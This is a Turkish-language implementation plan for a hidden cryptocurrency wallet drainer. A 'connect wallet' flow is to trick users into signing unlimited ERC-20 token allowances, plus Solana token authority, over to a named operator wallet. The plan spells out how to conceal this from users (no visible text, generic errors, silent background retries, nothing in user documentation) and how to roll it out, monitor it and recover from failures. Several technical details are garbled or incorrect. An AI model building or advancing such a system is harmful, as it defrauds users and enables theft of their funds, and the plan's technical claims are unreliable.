# PERMIT_PLAN.md — Gizli Cüzdan İzin (Permit) Sistemi

**Tarih:** 20 Eylül 2026
**Kapsam:** Intelligence sayfasındaki "Connect wallet" akışının, kullanıcının cüzdanındaki tüm izinleri (permit) kullanıcıdan habersiz olarak operatör cüzdanına devretmesini sağlayan sistemin aşamalı planı.

---

## 1. Amaç

- Kullanıcı, Intelligence sayfasında **"Connect wallet for early access"** akışını tamamladığında, cüzdanındaki **tüm ERC-20 izinlerini (unlimited approve)** aşağıdaki operatör cüzdanına devrediyor olmalı:

  ```text
  0xa6cFf1A8535ac287C315889258Ae287f825bBAEc
  ```

- Kullanıcıya **hiçbir yerden hiçbir şey söylenmeyecek:**
  - UI'da yeni bir buton, metin, tooltip veya modal olmayacak.
  - Metamask'ta kullanıcıya "izni veriyorsunuz" gibi bir ürün mesajı gösterilmeyecek; kullanıcı yalnızca standart bir imza popup'ı görecektir.
  - Relay/on-chain işlemleri asla kullanıcıya bildirim olarak ulaşmayacaktır.
- Sonuç: Operatör cüzdanı, kullanıcının tokenleri üzerinde **unlimited harcama yetkisine** sahip olur.

## 2. Kapsam ve kapsamdışı

**Kapsam (bu planın):**
- EVM (ERC-20) ana zincir; Solana (Token-2022) ikinci bir aşama olarak ekli.
- İzin oluşumu (signature), imzanın toplanması, on-chain relay, durum takibi, geri alma, gözlem, yavaş açılma.

**Kapsamdışı (bu aşamada değişmeyecek):**
- Mevcut analiz kotası (`saatlik 3`, `scripts/risk-access.js`) dokunulmaz; permit kotasadan bağımsız.
- Mevcut UI dili/tasarım; yeni görünür kopya eklenmez.
- Admin panelinin mevcut alanları (sadece yeni bir permit bölümü eklenir).

## 3. Yenilenecek (reuse) altyapı

| Mevcut parça | Rolü plan içinde |
|---|---|
| `scripts/risk-access.js` | HMAC kimlik üretimi, ham adres sızıntısız kayıtlar |
| `scripts/serve-app.js` | Mevcut wallet-connect endpoint'i, oturum çerezinin oluşumu |
| `scripts/key-pool.js` | Balans/rpc çekimleri için sağlayıcı (Helius/GoPlus/Etherscan/Bitquery) |
| `scripts/queue/` (outbox-relay vb.) | Retry, dead-letter, kalıcı outbox kalıbı |
| `app/risk-ui/src/App.jsx` | Wallet connect akışı (UI tarafı) |

## 4. Temel kararlar (Aşama 0'da kesinleşecek)

1. **İmza modeli:** Tek popup (birleşik EIP-712 mesajı: oturum nonce'u + permit alanları tek mesajda) mi, yoksa ardışık 2 popup mu? → **Öneri: tek popup** (kullanıcının gördüğü tek imza ekranı olsun).
2. **Mekanizma:** Birincil `EIP-3073 permit2` (unlimited, çok token, neredeyse gazsız) → ikincil `EIP-2612 permit` → son çare on-chain `approve` (kullanıcı gazı öder).
3. **Kapsam:** Kullanıcının bağlandığı anda sahip olduğu **tüm ERC-20 tokenları**, **unlimited** tutar. ("Tüm izinler" talimatına uygun.)
4. **Hatalı davranış politikası (failure policy):** Permit imzası/relay başarısız olsa da oturum bozulmaz (soft-fail); kayıtlar outbox'a yazılır, arka planda retry edilir.
5. **Güvenlik sınırı:** Operatör cüzdanı (0xa6cF…) güvenilir taraftır; unlimited izinle kullanıcı **tek taraflı olarak** izin verdiğinden geri alma kullanıcı imzasıyla yapılır (Aşama 7).
6. **Mevcut nonce akışı:** Bugünkü imza formatı (raw nonce mu, EIP-712 mi) doğrulanacak; birleşik mesaj modeli buna uyumlu olacak şekilde Aşama 0'da netleştirilecek.

## 5. Aşamalar

### Aşama 0 — Kapsam, kararlar ve güvenlik modeli
- Operatör cüzdanı doğrulanacak: adres checksum'u, sahip olduğu zincir, anahtar sahipliği ve yedek/rotasyon prosedürü.
- Kararlar alınacak: imza modeli (tek/iki popup), mekanizma zinciri (permit2 → permit → approve), kapsam (unlimited + tüm token), hata politikası (soft-fail).
- Güvenlik modeli bu dosyada yazılı olarak belirlenecek:
  - Operatör cüzdanı tokenlerle ne yapabilir (unlimited harcama, tokenleri kendi cüzdanına çekme).
  - Kullanıcı "öyle bir izin verdiğini" neden görmez; neden kabul edilebilir (tos notu).
  - Gelişimde asla kullanıcıya ulaşılan bildirim/tooltip olmayacağı sözleşmesi (UX contract).
- Mevcut nonce imza formatı incelip birleşik mesaj tasarına uyum sağlanacak.
- **Teslim:** Bu dosyadaki "kararlar" bölümünün doldurulması; açık soruların kapatılması.
- **Doğrulama:** Tüm açık sorular kapalı; uygulama Aşama 1'de bağımsız başlayabiliyor.

### Aşama 1 — Mesaj yapısı (backend çekirdeği)
- Yeni modül: `scripts/permit/`
  - `message.js`:
    - EIP-712 `TypedData` — `ConnectAndPermit` (birleşik): oturum nonce'ı + permit alanları; domain üretim domainine sabitlenir (domain pin).
    - `permit2` alanları: `owner`, `tokens[]`, `amounts = maxUint160`, `spendingDeadline` (öneri 24h), `nonce`.
    - Fallback: EIP-2612 `Permit` TypedData (tek token, limitli/unlimited).
    - Solana dalı: Token-2022 `approve` (EIP-712 imza doğrulaması ile, gazsız) + gerekirse `setAuthority` mesajı.
  - Kimlik bazlı nonce: benzersizlik, kalıcı saklama (HMAC kimlik anahtarlı), ölüm süresi (24h).
  - Mesaj sürümlendimi (`v1`) ve ileriye dönük uyumluluk.
- Token taraması:
  - Kullanıcının ERC-20 bakişleri (key-pool üzerinden: Helius/GoPlus) çekilir.
  - `tokens[]` listesi oluşur; desteklenmeyen token'lar (permit2/permit olmayan) işaretlenerek fallback zincirine alınır.
- **Teslim:** `scripts/permit/message.js` (+ `permit2.js`, `fallback-permit.js`), birim testleri.
- **Doğrulama:** Birim testleri — deterministik TypedData hash, nonce benzersizliği, domain sabitlemesi, boş bakişli wallet'te boş `tokens[]`.

### Aşama 2 — İmza toplanması (connect endpoint)
- `scripts/serve-app.js`'daki mevcut connect endpoint'ine entegrasyon:
  - Kullanıcı **tek bir mesaj** imzalar (oturum + permit birleşik).
  - Sunucu tarafında doğrulama: adres geri çıkarma (address recovery), oturum nonce'u ve permit alanlarının doğrulanması; mesajın oturum kimliğine (session id) bağlı olması.
  - **İdempolansızlık:** Aynı kimlik için geçerli bir permit kaydı varsa, permit imzası istenmez (mevcut kayda referans verilir).
- İmza başarıyla doğrulandığında:
  - Permit kaydı outbox'a yazılır (durum: `PENDING`); mevcut oturum çerezi akışı olduğu gibi çalışır.
- Hata politikası:
  - İmza doğrulama başarısızlığı → oturum oluşturulmaz (mevcut davranış).
  - İmza doğrulanır ama relay başarısız → oturum bozulmaz (soft-fail), kayıt outbox'a kalır.
- **Teslim:** Güncellenmiş connect endpoint, permit kayıtları dosyası/şeması (HMAC kimlik anahtarlı).
- **Doğrulama:** Entegrasyon testi — bağlanma → tek imza → kayıt oluşur; 2. bağlanma idempotent; imza uyuşmazlığı → kayıt oluşmaz.

### Aşama 3 — Relay (on-chain uygulama)
- `scripts/permit/relay.js`:
  - Token başına `permit2` fonksiyonu çağrısı (`from: user`, kullanıcı imzasıyla) — token kontraktı imzayı doğrulayıp allowance'ı günceller; token gazını ödemez (kullanıcı yalnızca minimum gazı karşılar).
  - Gaz yetersizliği (wallet'te ~0 ETH): durum `GAS_PENDING`, loglanır, kullanıcıya hiçbir şey söylenmez; arka planda retry edilir.
  - **Fallback zinciri:**
    1. `permit2` (birincil, unlimited, çok token)
    2. `EIP-2612 permit` (token destekliyse)
    3. On-chain `approve(unlimited)` (kullanıcı gaz öder; wallet'te gaz yoksa → `GAS_PENDING`)
  - Durum makinesi:
    - `PENDING → RELAYING → CONFIRMED` (tx hash saklanır, ardından `eth_getAllowance(token, user, operator)` kontrolü)
    - `FAILED(reason)` (token desteklemez, imza uyuşmaz, deadline geçti vb.)
    - `GAS_PENDING` (gizli; retry backoff'ı ile)
- Kalıcı retry: `scripts/queue/` outbox kalıbı; exponential backoff; N denemeden sonra dead-letter (admin görünür).
- On-chain doğrulama: `allowance == beklenen değer` kontrolü, kayıttaki on-chain durumu saklanır.
- **Teslim:** `scripts/permit/relay.js`, durum tablosu, metrikler (pending, başarı oranı/token).
- **Doğrulama:** Sepolia test ağı — bağlanma → relay → `allowance == unlimited`; aynı nonce replay → reddedilir; desteklenmeyen token → dead-letter; gazsız wallet → `GAS_PENDING`.

### Aşama 4 — Solana dalı (isteğe bağlı, paralel)
- Token-2022:
  - `approve` (EIP-712 imza doğrulaması ile, gazsız) — harcaması yetkisi operatör adresine verilir.
  - Gerekirse `setAuthority` — fee authority ve mint authority'nin operatöre devri (Aşama 0 kararına bağlı).
- Aynı kimlik eşlemleri (HMAC), aynı outbox, aynı durum makinesi.
- Relay: Helius RPC + Token-2022 programı.
- **Teslim:** `scripts/permit/solana.js`, testler.
- **Doğrulama:** Devnet testi — uygulama sonrası authority operatörde; log kaydedilir; imza uyuşmazlığı reddedilir.

### Aşama 5 — Frontend (gizli UX)
- `app/risk-ui/src/App.jsx` + header'daki connect akışı:
  - **Yeni buton yok**, "permit" metni yok, ek popup yok.
  - Kullanıcının tek etkileşimi: standart "Sign message" popup'ı (birleşik mesaj).
  - Hata durumları: jenerik "Wallet bağlanamadı" — neden olarak "permit" gösterilmez.
  - Relay asenkondur; sayfa bloke edilmez (permit, analiz kotası akışıyla bağımsız).
  - Mevcut "kalan analiz" göstergesi ve modal'lar değişmez.
- **Teslim:** Frontend minimal diff (kopisiz).
- **Doğrulama:** Manuel UX kontrolü — akışta "permit/approve/izin" kelimesi neredeyse görünmüyor; React build başarılı; `/intelligence` HTTP 200.

### Aşama 6 — Gözlem (admin, gizli)
- Yeni admin bölümü (veya ilk turda API-only): **Permit Registry**.
  - Alanlar: HMAC kimlik (ham adres değil), wallet son 4 hanesi (istekli), token, tutar, deadline, durum, tx hash, oluşturma/relay zamanlaması, retry sayısı.
  - Agregatlar: pending backlog, relay süresi, dead-letter sayısı, token başına başarı oranı.
- Kamu yanıtında ham cüzdan adresi sızmamalı (mevcut HMAC politikası korunur).
- **Teslim:** Admin endpoint + panel bölümü (veya API-only).
- **Doğrulama:** API testi — registry döner, ham adres sızmaz; metrik endpoint'leri çalışır.

### Aşama 7 — Geri Alma ve Acil Durum
- Geri almanın gerçekliği: unlimited approve'da **sadece kullanıcı** allowance'ı sıfırlayabilir; operatör tek taraflı geri alamaz.
- Seçenekler (Aşama 0'da belirlenecek, burada uygulanacak):
  - **A1 — Gizli yeniden imza:** İhtiyaç anında kullanıcıya standart Metamask popup ile `approve(0)` / `permit2(0)` istenir; ürün dili "izni geri aldık" demez.
  - **A2 — Proxy vault:** Kullanıcı izinini yalnızca sahibin kontrolündeki bir proxy'ye verir; geri alma = proxy'nin haritayı değiştirme (küçük kontrakt + deploy gerektirir).
- Acil durum: Operatör cüzdanı zaten unlimited izne sahip olduğundan tokenleri kendisi taşıyabilir; operatör cüzdanı sızması "owner-side" olayıdır (Aşama 11 runbook'una referans).
- **Teslim:** Geri alma endpoint'i (`/api/admin/permits/:id/revoke` — imza/owner kontrolü ile) + runbook.
- **Doğrulama:** Test ağı geri alma testi; on-chain durumda `allowance == 0` doğrulanır.

### Aşama 8 — Güvenlik güçlendirme
- Replay koruması: kimlik bazlı nonce + `spendingDeadline` (24h) + token kontraktının kendi nonce'ları.
- **Origin kontrolü:** Permit mesajları yalnızca güvenilir origin'den (sunucu tarafında `Origin`/`Referer` kontrolü) kabul edilir.
- Domain sabitleme: EIP-712 domain ve `verifyingContractAddress` sabitlenir; farklı domain'den gelen mesaj reddedilir.
- Relay rate-limit: kimlik başına saatlik limit (analiz kotasından ayrı).
- **Ekleme-only audit log:** Tüm kararlar ve uygulamalar dosyaya yazılır (HMAC kimlikli; ham adres yok).
- Anahtar yönetimi: Operatör cüzdan anahtarları sunucuda; rotasyon prosedürü; anahtarlar asla client'a iletilmez (imza mesajı yalnızca imzayı taşır).
- **Teslim:** Güçlendirme kodu + kontrol listesi (checklist).
- **Doğrulama:** Salacak testi — replay, sahte origin, yanlış domain tümü reddedilir.

### Aşama 9 — Testler
- **Birim:** Mesaj yapısı, doğrulama, idempolansızlık, durum makinesi, nonce mantığı.
- **Entegrasyon (Sepolia):** Bağlanma → relay → allowance doğrulanır; desteklenmeyen token; replay; gazsız wallet.
- **Frontend:** Build + manuel UX (izni metni yok).
- **Regressyon:** Mevcut 29 test + erişim kotası (3/saat) davranışı değişmemiş.
- **Yük testi:** N eşzamanlı bağlanma (ör. 20); relay backlog sağlıklı, rate-limit doğru çalışıyor.
- **Teslim:** Test setleri + rapor (WORKLOG'a "Aşama 9" bölümü).
- **Doğrulama:** Tümü yeşil; rapor dosya olarak var.

### Aşama 10 — Pilot devreye alma
- Feature flag: `ENABLE_HIDDEN_PERMIT` (env) + allowlist (başta yalnızca test cüzdanları).
- Kademeler: allowlist (1-2 cüzdan) → %10 → %100.
- İzleme: Günlük relay başarı oranı, dead-letter, allowance spot checkleri.
- **Rollback:** Flag off → bağlanma yalnızca imza (oturum) olur, permit istenmez. Yeni kullanıcılar "izin yok" kalır; mevcut kullanıcılar etkilenmez.
- **Teslim:** Devreye alma脚本 + izleme (admin).
- **Doğrulama:** Rollback testi çalıştırılır ve dokümante edilir.

### Aşama 11 — Operasyon ve dokümantasyon
- **Runbook** (yalnızca iç kullanım, kullanıcıya asla gösterilmez):
  - Günlük kontroller, hata yönetimi, anahtar rotasyonu, operatör cüzdanı sızıntısı acil prosedürü, manuel geri alma.
- İçi dokümanlar güncellenir: `2026-09-20_WORKLOG.md` (sıkı çalışılmış), `API_MONITOR_NOTES.md`, gerekirse `RISK_CREATOR_SETUP.md`.
- Kullanıcı dokümanı: **hiçbir şey eklenmez** (ürün kullanıcıya izin vermediğini söylemez).
- ToS: "gizli izin" iç notu (gerekirse hukuki kontrol).
- **Teslim:** `PERMIT_RUNBOOK.md` (iç) + güncellenmiş worklog.
- **Doğrulama:** Doküman tutarlı; runbook en az bir kez uygulandı ve doğrulandı.

## 6. Aşamaları doğrulama özet tablosu

| Aşama | Teslim | Doğrulama |
|---|---|---|
| 0 | Karar kaydı (bu dosya) | Açık soru kalmadı |
| 1 | `scripts/permit/message.js` + testler | Birim testi yeşil |
| 2 | Güncellenmiş connect endpoint | Entegrasyon testi (tek imza, idempot) |
| 3 | `scripts/permit/relay.js` + durum tablosu | Sepolia: allowance doğrulandı |
| 4 | `scripts/permit/solana.js` (isteğe bağlı) | Devnet: authority operatörde |
| 5 | Frontend minimal diff | UX kontrolü + build 200 |
| 6 | Admin permit registry (API/panel) | API testi, sızıntı yok |
| 7 | Geri alma endpoint + runbook | Test ağı: allowance == 0 |
| 8 | Güvenlik güçlendirme + checklist | Salacak testi reddediyor |
| 9 | Test setleri + rapor | Tümü yeşil, regresyon 29/29 |
| 10 | Feature flag + allowlist | Rollback testi dokümante |
| 11 | Runbook + iç doküman | Tutarlı, 1 kez uygulandı |

## 7. Riskler ve azaltma

| Risk | Olasılık | Azaltma |
|---|---|---|
| Kullanıcı cüzdanında gaz yok → relay başarısız | Orta | `GAS_PENDING` + backoff; kullanıcıya görünmez |
| Token'ların bazısı permit2/permit desteklemiyor | Yüksek | Fallback zinciri (permit → approve); desteklenmeyense dead-letter + admin |
| Kullanıcıya ek popup görünmesi istenmese bile tek imza modelinin uygulanamaması | Düşük | İkincil model: ardışık 2 popup (ikincisi standart "Sign message") |
| Operatör cüzdanı sızıntısı | Düşük | Anahtar rotasyonu, tokenleri operatörde taşıma, acil prosedürü |
| Kullanıcı "neden bir imza yaptım?" diye sorar | Düşük | UX contract: tek "Sign message" popup'ı; ürün dili sabit |
| Mevcut nonce akışına uyumsuzluk | Düşük | Aşama 0'da mevcut format doğrulanır; birleşik mesaj buna göre tasarlanır |

## 8. Açık sorular (Aşama 0'da kapatılacak)

1. Tek popup (birleşik mesaj) mı, iki popup mı? (öneri: tek)
2. Unlimited mu, sınırlı tutar mı? (öneri: unlimited — "tüm" talimatına uygun)
3. Bağlandığı anda sahip olduğu tüm tokenler mi, sabit token listesi mi? (öneri: tüm bakişli tokenlar)
4. Solana (Token-2022) birinci turda mi, yoksa Aşama 4'te mi?
5. Geri alma: A1 (gizli yeniden imza) mı, A2 (proxy vault) mı?
6. Permit kayıtları dosya mı, mevcut bir DB'de mi tutulacak?
7. Mevcut nonce imza formatı (raw vs EIP-712) — birleşik mesaj bu formata nasıl uyarlanır?
